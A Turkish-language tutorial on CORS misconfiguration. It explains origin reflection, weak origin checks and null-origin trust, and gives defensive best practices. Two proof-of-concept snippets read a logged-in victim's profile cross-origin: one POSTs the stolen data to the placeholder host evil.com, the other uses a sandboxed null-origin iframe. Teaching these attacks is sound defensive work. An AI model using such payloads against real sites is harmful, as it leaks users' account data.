# CORS Yanlış Yapılandırması

## Tanım

CORS (Cross-Origin Resource Sharing), tarayıcıların bir web sayfasının kendi kökeni (origin) dışındaki bir sunucuya yaptığı istekleri kontrol eden bir mekanizmadır. "Origin" derken kastedilen üçlü, şema + ana bilgisayar adı + port birleşimidir: `https://banka.com:443` gibi. Bu üçlünün herhangi bir parçası farklıysa, tarayıcı açısından iki köken farklıdır.

CORS'un doğduğu yer, tarayıcının en temel güvenlik ilkesi olan **Same-Origin Policy** (SOP, Aynı Köken Politikası) sınırlamasıdır. SOP, `evil.com` üzerindeki bir JavaScript'in `banka.com`'un cevap gövdesini okumasını engeller. Ancak modern web uygulamaları API'leri farklı alt alan adlarında (`api.banka.com`) barındırmak, üçüncü taraf servislerle konuşmak gibi meşru sebeplerle köken sınırını aşmak zorundadır. CORS, sunucunun tarayıcıya "bu kökenden gelen isteklere cevabımı okumana izin veriyorum" demesini sağlayan, kontrollü bir gevşetme protokolüdür.

**CORS yanlış yapılandırması**, sunucunun bu izinleri fazla cömert, dikkatsiz ya da mantık hatası içerecek şekilde vermesidir. Sonuç genellikle şudur: saldırganın kontrolündeki bir siteyi ziyaret eden bir kurbanın, oturum kimlik bilgileriyle (cookie, token) birlikte hedef siteye istek atması ve hassas cevabın saldırgana sızması. Yani CORS misconfig, aslında bir "veri sızıntısı" ve "hesap ele geçirme" zafiyetidir; çoğu zaman CSRF ile karıştırılır ama farkı kritiktir: CSRF sunucuda bir **eylem** tetikler, CORS misconfig ise sunucudan **veri okur**.

## Kök Neden ve Çalışma Mantığı

CORS'un nasıl bozulduğunu anlamak için önce doğru çalışma biçimini görmek gerekir. Tarayıcı, köken dışı bir `fetch` ya da `XMLHttpRequest` isteği yaptığında, isteğe otomatik olarak bir `Origin` başlığı ekler; bu başlık isteği başlatan sayfanın kökenini taşır ve JavaScript ile değiştirilemez. Sunucu cevabında iki kritik başlık döner:

- `Access-Control-Allow-Origin` (ACAO): Cevabı hangi kökenin okuyabileceğini söyler.
- `Access-Control-Allow-Credentials` (ACAC): `true` ise, tarayıcı cookie ve HTTP kimlik doğrulama bilgilerini isteğe dahil eder ve cevabın okunmasına izin verir.

Kritik nokta şudur: **İzin denetimini yapan taraf tarayıcıdır, sunucu değildir.** İstek her hâlükârda sunucuya gider ve sunucu isterse veriyi işler. Tarayıcı yalnızca, dönen cevabı çağıran JavaScript'e **teslim edip etmeyeceğine** ACAO başlığına bakarak karar verir. Yani CORS bir sunucu tarafı erişim kontrolü değil, tarayıcı tarafı bir okuma kapısıdır. Bu ayrım, neden CORS'un asıl korumadan sorumlu olamayacağını da açıklar.

### Kök neden 1: Origin yansıtma (origin reflection)

En yaygın ve en tehlikeli hata budur. Standart, `Access-Control-Allow-Origin` başlığının ya tek bir sabit köken ya da `*` (wildcard) değeri taşımasına izin verir; **birden fazla köken listesi** desteklemez. Geliştirici, birden çok alt alan adına ya da ortama izin vermek istediğinde bu kısıtla karşılaşır ve pratik ama tehlikeli bir çözüme sarılır: gelen isteğin `Origin` başlığını okuyup, aynen cevabın `Access-Control-Allow-Origin` başlığına yazar.

```
İstek:
  GET /api/hesap-bilgisi HTTP/1.1
  Host: api.banka.com
  Origin: https://evil.com
  Cookie: session=...

Cevap (YANLIŞ yapılandırma):
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://evil.com   <-- gelen Origin aynen yansıtıldı
  Access-Control-Allow-Credentials: true
  ...hassas veri...
```

Bu davranış, sunucuyu efektif olarak "her kökene izin veren" bir hâle getirir; çünkü saldırgan `Origin` başlığına ne yazarsa sunucu onu onaylar. Geliştiricinin zihnindeki niyet "izinli listemdeki kökenler" olsa da, kodda gerçek bir doğrulama (allowlist kontrolü) olmadığı için sonuç sınırsız güvendir. Kök neden, dinamik bir değeri güvenlik kararı olarak kullanmak ve onu doğrulamamaktır.

### Kök neden 2: Credentials ile birleşince oluşan patlama

Origin yansıtması tek başına, kimlik bilgisi taşımayan (public) API'lerde çoğu zaman ciddi bir sorun değildir; çünkü saldırgan zaten kendi tarayıcısından o public veriyi çekebilir. Zafiyeti gerçek anlamda tehlikeli yapan `Access-Control-Allow-Credentials: true` ile birleşmesidir.

`ACAC: true` olduğunda, kurbanın tarayıcısı hedefe istek atarken kurbanın oturum cookie'lerini otomatik olarak ekler. Böylece saldırgan, kurbanın kimliğiyle kimlik doğrulaması gerektiren endpoint'lere erişip cevabı okuyabilir. İşte kök neden burada bir spesifikasyon güvenliğiyle çakışır: **standart, `Access-Control-Allow-Origin: *` ile `Access-Control-Allow-Credentials: true` kombinasyonunu açıkça yasaklar.** Tarayıcı bu ikisini birlikte görürse isteği reddeder. Bu kural, wildcard'ın credentials ile kullanılmasının felaket olacağını bilen spesifikasyon yazarlarının koyduğu bir emniyet supabıdır.

Ancak bu emniyet supabı, geliştiricileri farkında olmadan daha kötü bir yola iter: `*` yasak olduğu için, credentials'lı senaryolarda "her yere izin verme" ihtiyacını karşılamak isteyen geliştirici, çareyi **origin yansıtmakta** bulur. Yansıtılan somut köken (`https://evil.com`) wildcard olmadığı için tarayıcı kuralı ihlal edilmiş saymaz ve credentials'lı sızıntı gerçekleşir. Yani spesifikasyonun `*`+credentials yasağı, kötü çözülürse doğrudan origin-reflection zafiyetine kanalize olur.

### Kök neden 3: Zayıf origin doğrulama mantığı

Bazı geliştiriciler yansıtmanın tehlikesini bilir ve bir kontrol koyar, ama kontrolü yanlış yazar. Bu, kör yansıtmadan daha sinsi bir sınıftır çünkü "biz doğruluyoruz" yanılsaması verir. Tipik hatalı desenler:

- **`startsWith` / prefix kontrolü:** `Origin.startsWith("https://banka.com")` kontrolü, `https://banka.com.evil.com` kökenini de geçirir; çünkü bu köken metin olarak doğru önekle başlar ama gerçekte saldırganın alan adıdır.
- **`endsWith` / suffix kontrolü:** `Origin.endsWith("banka.com")` kontrolü, `https://evilbanka.com` (bitişik) ya da `https://banka.com.evil.com` gibi kökenleri geçirebilir. Alan adı sınırlarını hesaba katmayan string eşleşmesi neredeyse her zaman atlatılabilir.
- **`includes` / substring kontrolü:** `Origin.includes("banka.com")` en gevşek olanıdır; `https://evil.com?x=banka.com` ya da `https://banka.com.evil.com` gibi her türlü değeri geçirir.
- **Kaçırılmamış nokta içeren regex:** `banka.com` gibi bir regex'te nokta özel karakterdir ve herhangi bir karaktere eşleşir; `bankaXcom` gibi beklenmedik eşleşmeler doğar.

Bu hataların kök nedeni ortaktır: alan adı, hiyerarşik ve sınırları belirli bir yapıdır; ama düz string işlemleri bu yapıyı bilmez. Doğru yaklaşım, gelen kökeni parse edip tam ve kesin eşleşme (exact match) yapmaktır.

### Kök neden 4: `null` origin güveni

Bazı sunucular, izinli kökenler listesine `null` değerini ekler. `null` origin, gerçek dünyada birkaç durumda ortaya çıkar: `file://` protokolüyle açılan yerel dosyalar, bazı yönlendirme (redirect) zincirleri ve en önemlisi **sandbox'lı iframe'ler**. Saldırgan, `sandbox` özniteliği taşıyan bir iframe içinde kendi JavaScript'ini çalıştırabilir; bu iframe'in kökeni `null` olur. Böylece sunucu `Access-Control-Allow-Origin: null` döndürüyorsa, saldırgan `null` kökenli bir bağlamdan credentials'lı istek atıp cevabı okuyabilir. `null`'ı güvenli bir köken sanmak, "kimliksiz olan güvenlidir" gibi hatalı bir sezgiden kaynaklanır; oysa `null` saldırgan tarafından üretilebilir bir değerdir.

## Somut Örnekler

### Örnek 1: Origin yansıtma ile hesap bilgisi sızdırma

`api.banka.com` hesap özetini `/api/profil` endpoint'inden cookie tabanlı oturumla sunuyor ve gelen `Origin`'i yansıtıyor olsun. Saldırgan `evil.com`'a şu betiği koyar ve kurbanı ziyaret ettirir:

```javascript
fetch("https://api.banka.com/api/profil", {
  credentials: "include"        // kurbanın cookie'leri gitsin
})
  .then(r => r.text())
  .then(veri => {
    // cevabı saldırganın sunucusuna gönder
    fetch("https://evil.com/topla", { method: "POST", body: veri });
  });
```

Kurban, bankaya giriş yapmış bir oturuma sahipken `evil.com`'u açtığında: tarayıcı `Origin: https://evil.com` başlığıyla ve kurbanın cookie'leriyle istek atar, sunucu bu kökeni yansıtıp `ACAC: true` döner, tarayıcı cevabın okunmasına izin verir ve profil verisi saldırgana akar. Kurbanın tek yaptığı kötü bir bağlantıya tıklamaktır.

### Örnek 2: `null` origin istismarı

Sunucu `Access-Control-Allow-Origin: null` + `ACAC: true` dönüyorsa, saldırgan sayfasına şöyle bir sandbox iframe gömer:

```html
<iframe sandbox="allow-scripts allow-same-origin" srcdoc="
  <script>
    fetch('https://api.banka.com/api/profil', { credentials: 'include' })
      .then(r => r.text())
      .then(d => parent.postMessage(d, '*'));
  &lt;/script&gt;
"></iframe>
```

Iframe'in kökeni `null` olduğu için sunucu izin verir ve veri dışarı sızar. Bu örnek, `null`'ın neden asla güvenli listede olmaması gerektiğini somutlaştırır.

## Sömürü/İstismar Mantığı ile Savunma

Aynı madalyonun iki yüzünü birlikte ele almak, hem saldırıyı hem korumayı doğru konumlandırmak açısından önemli.

### İstismarın ön koşulları — saldırgan neye ihtiyaç duyar

Bir CORS misconfig'in gerçekten sömürülebilir olması için birkaç koşulun bir arada gelmesi gerekir; bu koşullar aynı zamanda savunmanın nerede durabileceğini de gösterir:

1. **Zayıf ACAO:** Sunucu ya keyfi kökeni yansıtıyor, ya `null`'a güveniyor, ya da atlatılabilir bir doğrulama kullanıyor olmalı.
2. **Credentials'a bağımlı hassas veri:** İlgi çekici verinin `ACAC: true` ile ve oturum cookie'siyle korunuyor olması gerekir. Eğer veri zaten public ise CORS misconfig bir şey kazandırmaz.
3. **Kurbanın aktif oturumu:** Kurban, saldırganın sayfasını ziyaret ederken hedefte giriş yapmış olmalıdır.
4. **`SameSite` cookie engelinin aşılması:** Bu, modern savunmanın kalbindeki nokta.

### `SameSite` cookie'lerin kritik rolü

Origin-reflection saldırısının credentials'lı çalışması için kurbanın cookie'sinin **cross-site** istekte gönderilmesi gerekir. Modern tarayıcılar cookie'lere varsayılan olarak `SameSite=Lax` uygular; bu, cookie'nin üçüncü taraf bir sitenin başlattığı arka plan `fetch` isteklerine eklenmesini engeller. Yani `SameSite=Lax` ya da `Strict` ile işaretlenmiş bir oturum cookie'si, klasik origin-reflection sömürüsünü büyük ölçüde etkisiz kılar; çünkü cookie hiç gitmez, `ACAC: true` de bir işe yaramaz.

Bu durum saldırının kapsamını daralttı ama tümüyle ortadan kaldırmadı. Sömürünün hâlâ mümkün olduğu senaryolar:

- Cookie açıkça `SameSite=None` (ve `Secure`) olarak işaretlenmişse (üçüncü taraf entegrasyon ihtiyacıyla sıkça yapılır).
- Oturum, cookie yerine `Authorization` başlığı taşıyan bir token'la yürütülüyorsa — ama bu durumda tarayıcı token'ı otomatik eklemez; sızıntı ancak token'ın da erişilebilir olduğu özel akışlarda mümkün olur, dolayısıyla klasik CORS credentials sızıntısı esas cookie tabanlı oturumları hedefler.
- Saldırı, hedef sitenin kendi alt alan adları arasında ise (`SameSite` aynı site kabul eder), alt alan adı ele geçirme (subdomain takeover) ile birleşince yeniden güçlenir.

Savunma açısından çıkarım nettir: `SameSite` güçlü bir katmandır ama tek başına yeterli bir gerekçe değildir. CORS yapılandırmasını yine de doğru yapmak gerekir; `SameSite`, hatalı yapılandırmanın bedelini düşüren bir emniyet ağıdır, yapılandırmanın yerine geçmez. İyi güvenlik, katmanlı (defense in depth) düşünür.

### Savunma tarafı — doğru yapılandırma mantığı

Savunmanın özü, ACAO değerinin **hiçbir zaman güvenilmeyen girdiden türetilmemesidir**. Doğru akış şudur: sunucu, sabit ve kısa bir izinli kökenler listesi (allowlist) tutar; gelen `Origin` başlığını parse edip bu listeyle **tam eşleşme** kontrol eder; eşleşme varsa `Access-Control-Allow-Origin` başlığına o kökeni yazar, yoksa CORS başlığını hiç eklemez (isteği sessizce köken-dışı bırakır). Yansıtma yapılsa bile yansıtılan değer önce doğrulamadan geçtiği için, saldırgan kökeni listede olmadığından reddedilir.

Kilit ilke: yansıtmanın kendisi değil, **doğrulanmamış** yansıtma tehlikelidir. Doğrulanmış tam-eşleşme sonrası kökeni geri yazmak meşru ve gereklidir.

## Yaygın Hatalar

- **`*` ile `credentials`'ı birlikte kullanmaya çalışmak.** Standart bunu yasakladığı için tarayıcı reddeder; geliştirici bunu "düzeltmek" için origin-reflection'a kaymamalıdır. Eğer gerçekten wildcard'a ihtiyaç varsa, o endpoint credentials taşımamalı ve hassas veri döndürmemelidir.

- **`Origin` başlığını güvenlik kararı için doğrulamadan kullanmak.** `Origin` istemci tarafından geldiği için sunucuya varana kadar başka bir istemci tarafından değiştirilemese de, saldırganın kendi tarayıcısı/sayfası bu başlığı istediği meşru değerle gönderir. Yani `Origin`, "isteği kimin başlattığı" hakkında ipucu verir ama kimlik doğrulama yerine geçmez.

- **String eşleşmeleriyle (`startsWith`, `endsWith`, `includes`) origin doğrulamak.** Alan adı sınırlarını (nokta, port, şema) hesaba katmayan her yaklaşım atlatılabilir. `banka.com.evil.com` ve `evilbanka.com` gibi kökenleri hatırlamak, bu hatanın neden yaygın olduğunu gösterir.

- **`null` kökenini güvenli listeye almak.** Sandbox iframe ile üretilebildiği için `null` hiçbir zaman güven verici bir köken değildir.

- **CORS'u CSRF koruması sanmak.** CORS, cevabın **okunmasını** kısıtlar; isteğin sunucuya **ulaşmasını** ve orada bir eylem tetiklemesini engellemez. Basit (simple) istekler (örneğin belirli `Content-Type`'lı `POST`) preflight bile tetiklemeden sunucuya gider ve durum değiştirici bir işlem yapabilir. CSRF için ayrıca anti-CSRF token, `SameSite` cookie ve `Origin`/`Referer` doğrulaması gerekir. İki mekanizma birbirinin yerine geçmez.

- **CORS'u erişim kontrolü sanmak.** Tarayıcı olmayan istemciler (curl, Postman, sunucudan sunucuya istekler) CORS başlıklarını hiç dikkate almaz; CORS yalnızca tarayıcı ortamında anlam taşır. Gerçek yetkilendirme her zaman sunucu tarafında token/oturum doğrulamasıyla yapılmalıdır.

- **Preflight'ta gereğinden geniş `Access-Control-Allow-Headers` / `-Methods` vermek.** `*` benzeri geniş izinler, hassas custom başlıkların ve yıkıcı metotların köken-dışı kullanımına kapı aralar.

- **Alt alan adlarına toptan güvenmek (`*.banka.com`).** Bir alt alan adı üçüncü tarafa aitse ya da subdomain takeover'a açıksa, tüm ana etki alanı için CORS güveni saldırgana devredilmiş olur.

## En İyi Pratikler

- **Sabit bir allowlist tutun ve tam eşleşme yapın.** Gelen `Origin`'i parse edip (şema + host + port bütünüyle) izinli kökenler kümesiyle birebir karşılaştırın. Eşleşme yoksa CORS başlığını hiç eklemeyin. Yansıtacaksanız yalnızca doğrulanmış değeri yansıtın.

- **`credentials` gerektiren endpoint'lerde asla `*` kullanmayın ve mümkün olan en dar köken kümesini tanımlayın.** Kimlik bilgisi taşıyan hassas API'lerde tek tek somut kökenler kullanın.

- **`null` kökenini asla listeye almayın.** Hiçbir meşru üretim akışı `null`'a güven gerektirmez.

- **Oturum cookie'lerini `SameSite=Lax` veya `Strict` ve `Secure`, `HttpOnly` ile işaretleyin.** `SameSite=None` yalnızca gerçekten üçüncü taraf bağlamda gerekliyse ve bilinçli bir kararla kullanılmalı. Bu, CORS hatalarının etkisini sınırlayan en güçlü ek katmandır.

- **Katmanlı savunma uygulayın.** CORS'u tek başına ne CSRF koruması ne de erişim kontrolü olarak görün. Sunucu tarafı yetkilendirme, anti-CSRF token'ları ve `SameSite` cookie'leri birlikte kullanın.

- **Preflight yanıtlarını daraltın.** `Access-Control-Allow-Methods` ve `Access-Control-Allow-Headers` değerlerini yalnızca gerçekten ihtiyaç duyulan metot ve başlıklarla sınırlayın. `Access-Control-Max-Age` ile preflight'ı makul süre cache'leyin ama izinleri geniş tutmayın.

- **Hassas veriyi credentials'lı köken-dışı okumaya kapatın.** Kimlik doğrulaması gerektiren yanıtların yalnızca güvenilir ve sayısı az kökenlere açık olduğundan emin olun; kritik endpoint'lerde ek olarak custom header gerektirmek (basit istek olmayı bozup preflight'ı zorunlu kılar) ek bir bariyer sağlar.

- **Alt alan adı güvenini gözden geçirin.** `*.alanadi.com` gibi geniş kalıplardan kaçının; subdomain takeover riskini periyodik denetleyin, çünkü ele geçirilen bir alt alan adı tüm CORS güvenini çürütür.

- **Test edin ve otomatik denetleyin.** Farklı `Origin` değerleriyle (rastgele bir köken, `null`, `banka.com.evil.com`, `evilbanka.com`) istek atıp dönen `Access-Control-Allow-Origin` ve `Access-Control-Allow-Credentials` başlıklarını gözlemleyin. Sunucu keyfi kökeni yansıtıyorsa ya da `null`'ı onaylıyorsa yapılandırma hatalıdır. Bu testleri CI/CD sürecine dahil ederek gerilemeleri (regression) erken yakalayın.

Özetle CORS yanlış yapılandırması, çoğu zaman "çok kökene izin verme" ihtiyacının pratik ama denetimsiz bir çözümle (origin yansıtma) karşılanmasından doğar; credentials ile birleştiğinde kurbanın oturumu üzerinden veri sızdırmaya dönüşür. Doğru duruş; sabit allowlist ile tam eşleşme, credentials'lı endpoint'lerde asla wildcard kullanmama, `null`'a güvenmeme ve `SameSite` cookie'leriyle katmanlı savunmadır.
